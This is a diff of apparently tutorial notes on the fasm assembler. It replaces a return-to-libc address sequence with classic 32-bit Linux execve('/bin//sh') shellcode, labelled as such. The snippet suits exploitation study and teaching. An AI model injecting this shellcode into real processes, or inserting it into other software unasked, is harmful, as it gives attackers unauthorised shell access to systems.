@@ -11,11 +11,19 @@ apt install fasm -y
 
 ```
 ; fasm example: this generates raw instruction in a file
+; x86_32 shellcode
 format binary
 use32 ; 32b
-	push 0xb7f83a24 ; ptr to shstr
-	push 0xb7e63190 ; addr of system
-	jmp  DWORD [esp] ; addr of system
+    xor    eax,eax
+    push   eax
+    push   0x68732f2f
+    push   0x6e69622f
+    mov    ebx,esp
+    push   eax
+    push   ebx
+    mov    ecx,esp
+    mov    al,0xb
+    int    0x80
 ```
 
 ```
